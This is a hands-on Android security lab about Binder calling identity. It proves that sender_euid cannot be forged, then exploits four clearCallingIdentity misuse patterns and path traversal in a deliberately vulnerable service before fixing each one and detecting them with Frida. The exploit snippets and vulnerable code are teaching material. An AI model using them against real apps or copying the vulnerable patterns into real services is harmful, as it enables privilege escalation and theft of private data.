# Lab 03 — The identity boundary: prove it, then break the code around it

> **Difficulty:** intermediate
> **Time:** 2.5–4 hours
> **Needs:** `adb`, a device (no root for Parts A and B), the NDK for Part A, Android Studio for
> Part C. Frida is optional and only for Part D.
> **Reading:** [README §3.11](../README.md#311-identity--the-chapters-thesis-measured), [§3.12](../README.md#312-clearcallingidentity--the-mechanism-and-how-a-confused-deputy-is-born), [24 — IPC §3.21.2](../../24-IPC/README.md#3212-clearcallingidentity-and-restorecallingidentity--and-the-vulnerability-pattern)
> **Prerequisite labs:** [01](lab-01-service-list-and-call.md), [02](lab-02-parcel-anatomy.md)

---

## Objective

**Part A.** Prove, by experiment rather than by assertion, that `sender_euid` cannot be forged — and
explain the one kernel line that makes it so.

**Part B.** Understand exactly what `clearCallingIdentity()` does, including why its "token" is not a
capability.

**Part C.** Exploit all four misuse patterns in a deliberately vulnerable service, then fix each and
verify the fix.

**Part D.** Detect all four at runtime with Frida, on code you did not write.

---

## Why this lab exists

Two claims are made about Binder identity everywhere, and they are in tension:

1. *"`Binder.getCallingUid()` cannot be forged."*
2. *"Most Binder vulnerabilities are identity failures."*

Both are true, and the tension is the whole lesson. The transport is sound. The failures are in the
code at either end — overwhelmingly in code that takes the unforgeable value and then throws it away.

Claim 1 also deserves scepticism, because the structure a caller fills in **contains a `sender_euid`
field**. It is right there, writable, in the caller's own memory. Anyone who has read the header and
not the driver would reasonably assume it is forgeable. Part A settles it with an experiment.

---

# Part A — Prove the stamp

## Task A1 — Look at the field you are told you cannot use

Open [`../examples/binder-probe.c`](../examples/binder-probe.c) and find `binder_transaction_data`:

```c
struct binder_transaction_data {
    ...
    __u32            code;
    __u32            flags;
    pid_t            sender_pid;   /* filled by the KERNEL on delivery */
    uid_t            sender_euid;  /* filled by the KERNEL on delivery */
    ...
};
```

**We are the sender. This struct is in our memory. We can put anything in those fields.** The
program does exactly that:

```c
if (forge) {
    tr.sender_euid = forged_uid;
    tr.sender_pid  = 1;
}
```

## Task A2 — Choose an oracle

To prove anything you need a service that will **tell you what UID it saw**. Most refuse silently.
`INotificationManager` transaction 2 does not:

```bash
# adb shell
service call notification 2
```

```
Result: Parcel(
  0x00000000: ffffffff 0000001c 00690044 00610073 '........D.i.s.a.'
  ...  ->  SecurityException: "Disallowed call for uid 2000"
```

That message is the service reporting `Binder.getCallingUid()` straight back to us. It is a perfect
oracle: no root, no instrumentation, and the answer is in plain text.

**Exercise.** Find a second oracle on your device before continuing. Look for services whose
refusal message contains a number matching your uid. `service call <svc> <code> | grep -i uid` over
a small code range is enough. Having two oracles means a single service's quirk cannot mislead you.

## Task A3 — Run the experiment

Build and push (Lab 02 Task 6 if you have not):

```bash
# host
$NDK/aarch64-linux-android21-clang -Wall -Wextra -O2 ../examples/binder-probe.c -o /tmp/binder-probe
adb push /tmp/binder-probe /data/local/tmp/ && adb shell chmod 755 /data/local/tmp/binder-probe
```

Three runs. Record the reply message from each.

```bash
# adb shell — run 1: honest
/data/local/tmp/binder-probe --call notification 2 | grep -E "message|forge"

# adb shell — run 2: claim to be root
/data/local/tmp/binder-probe --call notification 2 --forge-uid 0 | grep -E "message|forge"

# adb shell — run 3: claim to be system
/data/local/tmp/binder-probe --call notification 2 --forge-uid 1000 | grep -E "message|forge"
```

Measured on the reference device (real uid 2000):

| Run | We wrote into `sender_euid` | Service replied |
|---|---|---|
| 1 | nothing | `"Disallowed call for uid 2000"` |
| 2 | `0` | `"Disallowed call for uid 2000"` |
| 3 | `1000` | `"Disallowed call for uid 2000"` |

Run 2 printed, before sending:

```
  [forge] wrote sender_euid=0 sender_pid=1 into the outgoing
          binder_transaction_data before calling ioctl().
```

so we know the field really was set. It simply never arrived.

## Task A4 — Explain it

Do not accept "the kernel does it". Find the line.

In `drivers/android/binder.c`, inside `binder_transaction()`:

```c
t->sender_euid = task_euid(proc->tsk);
```

Answer these:

1. What is `proc->tsk`, and where does it live — user memory or kernel memory?
2. At what point in the transaction's life is that assignment made, relative to the target being
   woken?
3. Why does the structure have the field at all, if it is ignored on the way in?
4. Trace the value from that line to `Binder.getCallingUid()` in Java. Name each layer. (Model
   answer: [README §3.11.3](../README.md#3113-why--the-one-line-that-does-it).)
5. `sender_pid` is handled differently from `sender_euid`. How, and what is the observable
   consequence for a `oneway` transaction?

## Task A5 — Now find what *does* work

You have proved impersonation is impossible. So the attacks must be elsewhere. Name three routes an
attacker takes instead, and for each say why `getCallingUid()` does not stop it.

<details>
<summary>Check yourself</summary>

- **Shared UID.** Two apps with `android:sharedUserId` and the same signing key have literally the
  same UID. There is nothing for `getCallingUid()` to distinguish.
- **UID recycling.** After an uninstall, the app-id is reused. Any authorisation persisted against a
  bare number can be inherited by an unrelated app.
- **Confused deputy.** Do not become another UID; persuade a privileged service to act for you. This
  is Part C, and it is the one that matters.

</details>

---

# Part B — What `clearCallingIdentity()` actually is

## Task B1 — Read the ten lines

From `frameworks/native/libs/binder/IPCThreadState.cpp`:

```cpp
int64_t IPCThreadState::clearCallingIdentity()
{
    int64_t token = ((int64_t)mCallingUid << 32) | mCallingPid;
    clearCaller();
    return token;
}

void IPCThreadState::clearCaller()
{
    mCallingPid = getpid();
    mCallingUid = getuid();
}

void IPCThreadState::restoreCallingIdentity(int64_t token)
{
    mCallingUid = (int)(token >> 32);
    mCallingPid = (int)token;
}
```

**Answer, before reading further:**

1. What, exactly, is the value returned by `clearCallingIdentity()`?
2. Could you construct one without ever calling it?
3. What happens if you call `clear` twice and `restore` once?
4. What happens if you restore a token from a *previous* request?
5. Is the SELinux context saved and restored along with the uid and pid?

<details>
<summary>Answers</summary>

1. `(uid << 32) | pid`. Plain arithmetic on two numbers you can already read.
2. **Yes, trivially.** `restoreCallingIdentity(0x0000271000000001L)` sets the thread's calling
   identity to uid 10000, pid 1. Nothing validates it. It is a **save slot, not a capability**.
3. The thread stays cleared. There is no counter and no stack; the pairing is a convention.
4. The thread's calling identity becomes that earlier request's caller. This is pattern 4.
5. **No.** `mCallingSid` is cleared and not restored — AOSP's own comment says the SID is ignored for
   legacy reasons. So `getCallingSid()` returns null after any clear/restore round trip.

</details>

## Task B2 — Compute a token by hand

Your `adb shell` uid is 2000. Suppose the calling pid were 4321.

```
token = (2000 << 32) | 4321
      = 0x000007D000000000 | 0x00000000000010E1
      = 0x000007D0000010E1
```

Verify with anything:

```bash
# host
python3 -c "print(hex((2000 << 32) | 4321))"
```

**Now the point.** If a service ever *logs* a token — and services do, in verbose builds — the log
line leaks the caller's uid and pid of that request. And if a service ever accepts a token from
outside itself, you can hand it any identity you like.

## Task B3 — Why the thread pool matters

Read [README §3.12.2](../README.md#3122-why-the-thread-pool-makes-it-dangerous) and answer:

1. When a transaction ends with identity still cleared, the kernel re-stamps `mCallingUid` at the
   start of the *next* transaction. So what, exactly, leaks?
2. Give a concrete example of state derived from a cleared identity that would survive.
3. Why is a `ThreadLocal` inside a Binder service a bug?

---

# Part C — Exploit and fix

## Task C1 — Build the vulnerable service

Create an Android Studio project with two modules, or two apps:

**Module `vault`** — the target.

```
vault/src/main/aidl/com/example/vault/IVaultService.aidl     <- ../examples/IVaultService.aidl
vault/src/main/aidl/com/example/vault/IVaultWatcher.aidl     <- ../examples/IVaultWatcher.aidl
vault/src/main/java/com/example/vault/VaultService.java      <- ../examples/VaultService-vulnerable.java
```

Rename the class to `VaultService`. In `vault/build.gradle`:

```gradle
android {
    buildFeatures { aidl true }
}
```

`AndroidManifest.xml` — deliberately unprotected:

```xml
<service android:name=".VaultService" android:exported="true" />
```

Seed a secret the attacker should not be able to read:

```java
// in VaultService.onCreate()
new File(getFilesDir(), "private").mkdirs();
try (FileWriter w = new FileWriter(new File(getFilesDir(), "private/tokens.txt"))) {
    w.write("FLAG{identity-was-never-checked}");
}
```

**Module `attacker`** — an ordinary, unprivileged app. Copy
[`../examples/RawBinderClient.java`](../examples/RawBinderClient.java) into it, plus a copy of the
two `.aidl` files so you get a generated `Stub` for convenience.

On API 30+ the attacker's manifest needs to be able to see the target:

```xml
<queries>
    <package android:name="com.example.vault" />
</queries>
```

## Task C2 — Confirm you are a different UID

```bash
# adb shell
dumpsys package com.example.vault  | grep -m1 userId
dumpsys package com.example.attacker | grep -m1 userId
```

Two different numbers. Everything below depends on that.

## Task C3 — Pattern 1: clear before the check

The vulnerable `readSecret`:

```java
public String readSecret(String name) {
    final long token = Binder.clearCallingIdentity();     // <-- TOO EARLY
    try {
        final int uid = Binder.getCallingUid();           // <-- now returns OUR uid
        if (uid != Process.SYSTEM_UID && !isTrustedUid(uid)) {
            throw new SecurityException("caller " + uid + " not permitted");
        }
        return readFileRaw(new File(name));               // <-- no path validation
    } ...
}
```

From the attacker app:

```java
IVaultService v = IVaultService.Stub.asInterface(binder);
String stolen = v.readSecret("/data/data/com.example.vault/files/private/tokens.txt");
Log.i("attack", "stolen = " + stolen);
```

**Expected:** the flag. You were never checked, because the check compared the service against
itself.

**Two failures compounded.** Even a correct identity check would not have saved this method, because
`name` goes straight into `new File(name)`. Try:

```java
v.readSecret("/proc/self/maps");
v.readSecret("/data/data/com.example.vault/shared_prefs/anything.xml");
```

**Write down** which failure each of those exploits.

## Task C4 — Pattern 2: the window is too wide

`writeSecret` checks identity correctly and *then* opens a window around everything:

```java
final long token = Binder.clearCallingIdentity();
try {
    final File f = resolvePath(name);   // caller-controlled
    writeFileRaw(f, value);             // the ONE privileged step
    indexSecret(f);
    notifyAllWatchers(name);            // CALLS OUT, still elevated
} finally { Binder.restoreCallingIdentity(token); }
```

**Exploit.** `resolvePath` is `new File(mVaultDir, name)` with no validation, so:

```java
v.writeSecret("../../shared_prefs/attacker_owned.xml", "<map><boolean name=\"is_admin\" value=\"true\"/></map>");
```

**Then the harder half.** `notifyAllWatchers` calls out to registered callbacks while identity is
still cleared. Register a watcher from the attacker app whose `onSecretChanged` makes a call back
into a third component. What identity does that third component see for *its* caller, and why does
that matter? Work it out before testing it.

## Task C5 — Pattern 3: no `finally`

```java
final long token = Binder.clearCallingIdentity();
final boolean gone = deleteFileRaw(resolvePath(name));  // may throw
Binder.restoreCallingIdentity(token);                   // <-- NOT in a finally
```

`deleteFileRaw` throws `IllegalArgumentException` for a name that does not exist. So:

```java
try { v.deleteSecret("no-such-thing"); } catch (Exception ignored) { }
```

The transaction ends with the thread still cleared.

**Observe it.** Part D's Frida script raises `[ALARM 2]` for exactly this. Before you get there,
reason about it: what would you have to add to `VaultService` to make the leak *observable* from the
attacker app? (Hint: a field cached while elevated, read on a later request.)

## Task C6 — Pattern 4: a token in a field

```java
private long mSharedToken;   // an INSTANCE field
...
mSharedToken = Binder.clearCallingIdentity();
try { ... } finally { Binder.restoreCallingIdentity(mSharedToken); }
```

**Exploit.** Two attacker threads calling `listSecrets()` concurrently, landing on two different
pooled Binder threads. One writes `mSharedToken`, the other overwrites it, and the first restores the
wrong value.

```java
for (int i = 0; i < 8; i++) {
    new Thread(() -> { for (int j = 0; j < 500; j++) {
        try { v.listSecrets(); } catch (Exception ignored) {}
    }}).start();
}
```

Race conditions are probabilistic; run it for a while. Part D's `[ALARM 3]` reports it
deterministically, which is why instrumentation beats brute force here.

## Task C7 — Fix them, one at a time

Swap in [`../examples/VaultService-fixed.java`](../examples/VaultService-fixed.java) **one method at
a time**, re-running each exploit after each change, so you see precisely which fix closed which
hole.

The shape is always the same five steps:

```java
final int uid = Binder.getCallingUidOrThrow();   // 1. CAPTURE, first statement
enforceCaller(uid);                              // 2. DECIDE
final File target = resolveInsideVault(name);    // 3. CONSTRAIN the target
final long token = Binder.clearCallingIdentity();// 4. ACT, one statement wide
try { return readFile(target); }
finally { Binder.restoreCallingIdentity(token); }// 5. RESTORE, always
```

**For each fix, answer:**

1. Which pattern did it close?
2. Would the fix still work if the caller had the same signing key? (Should it?)
3. Why `getCallingUidOrThrow()` rather than `getCallingUid()`?

## Task C8 — Defeat the naive path fix

Before looking at the shipped `resolveInsideVault`, write your own. Most people write:

```java
if (name.contains("..") || name.contains("/")) throw new IllegalArgumentException();
return new File(mVaultDir, name);
```

**Break it.** Two ways:

1. Create a symlink inside the vault by an earlier legitimate operation, then read through it. The
   name contains no `..` and no `/`.
2. Consider `mVaultDir` = `/data/user/0/com.example.vault/files/vault`. What does a naive
   `startsWith` prefix check do with `/data/user/0/com.example.vault/files/vaultevil`?

Now read the shipped version and identify the two lines that close each:

```java
final Path canonical = f.getCanonicalFile().toPath();
if (!canonical.startsWith(mVaultCanonical) || canonical.equals(mVaultCanonical)) {
    throw new IllegalArgumentException("escapes the vault");
}
```

**Question.** `mVaultCanonical` is resolved once, in `onCreate()`, not per request. Why does that
matter?

---

# Part D — Detect it at runtime

## Task D1 — Attach the tracer

```bash
# host
frida -U -f com.example.vault -l ../scripts/trace-binder-transactions.js
```

In the REPL:

```javascript
bt.only(/IVaultService/)
bt.help()
```

Now run each exploit from Part C and watch.

## Task D2 — Read each alarm

| Alarm | Fires when | Pattern |
|---|---|---|
| `[ALARM 1]` | `getCallingUid()` called after `clearCallingIdentity()` inside a transaction | 1 |
| `[ALARM 2]` | A transaction ended with identity still cleared | 3 |
| `[ALARM 3]` | `restoreCallingIdentity()` with an unknown token, or out of LIFO order | 4 |
| `[ALARM 4]` | `getCallingWorkSourceUid()` called at all | — |
| `[ALARM 5]` | An incoming transaction on an object with no interface descriptor | — |
| `[ALARM 6]` | An incoming parcel above the size threshold | — |

**Exercise.** Run the *fixed* service under the same tracer. Which alarms stop? Which, if any,
remain, and is each remaining one a true positive?

> **⚠️ Expect false positives, and understand why**
> `[ALARM 1]` fires on any `getCallingUid()` after a clear — including the very common and entirely
> correct case of reading it for a *log line*. A tool that could tell those apart would have to
> understand what the value is used for. Yours does not, and neither does any other. Every
> `[ALARM 1]` needs a human to look at the stack trace and decide. Say so in your report.

## Task D3 — Watch the forgery fail from the other side

Part A proved the forgery fails by reading the *reply*. Now watch it fail at the *receiver*.

With the tracer attached to a service you control, send a forged transaction:

```bash
# adb shell
/data/local/tmp/binder-probe --call <your-service> 1 --forge-uid 0
```

The tracer's `[IN ]` line reports `from = uid <your real uid>`. Two independent observations of the
same fact, from opposite ends of the transaction.

## Task D4 — Audit code you did not write

```bash
# host
jadx -d out/ some-system-app.apk

# every use, with context
grep -rn -A20 "clearCallingIdentity" out/sources/

# and the two shapes that are almost always wrong
grep -rn "checkCallingOrSelfPermission" out/sources/
grep -rn "getCallingWorkSourceUid"      out/sources/
```

For each `clearCallingIdentity` hit, answer the three questions:

1. Was the caller's identity checked **before** the clear?
2. How many statements are inside the window, and does any of them act on caller-supplied data?
3. Is the restore in a `finally`?

A "no" to any one is worth writing up. A "no" to (2) is usually exploitable.

---

## Task E — Answer these without looking

1. The `sender_euid` field is writable and in your own memory. Why does writing it do nothing?
2. Name the AOSP file and function containing the assignment that makes the stamp true.
3. What is the *exact* value returned by `clearCallingIdentity()`?
4. Can you construct a valid token without calling `clearCallingIdentity()`? What does that imply?
5. Is the SELinux context restored by `restoreCallingIdentity()`?
6. Why is `getCallingUidOrThrow()` preferred over `getCallingUid()`?
7. `getCallingPid()` returns 0. What does that tell you about the transaction?
8. Give two attacks that succeed *because* `getCallingUid()` is honest.
9. Why must a token never be stored in a field?
10. State the five-step safe shape, in order.

---

## Success criteria

- [ ] You ran the forgery experiment with at least two different claimed UIDs and recorded identical
      replies.
- [ ] You can name the kernel file and function containing the stamp, and trace the value to Java.
- [ ] You computed a `clearCallingIdentity` token by hand and it matched.
- [ ] You exploited all four patterns against the vulnerable service from an app with a different UID.
- [ ] You fixed each one and verified the corresponding exploit stopped working.
- [ ] You broke your own naive path check with a symlink and with a prefix collision, then fixed both.
- [ ] The Frida tracer raised alarms 1, 2 and 3 against the vulnerable build and stopped against the
      fixed one — and you triaged any survivors rather than assuming they were bugs.

---

## Next

[Lab 04 — Transaction limits and availability](lab-04-transaction-limits.md) — the 1016 KiB budget,
`TransactionTooLargeException`, and turning the async half-budget into a denial of service you can
actually report.
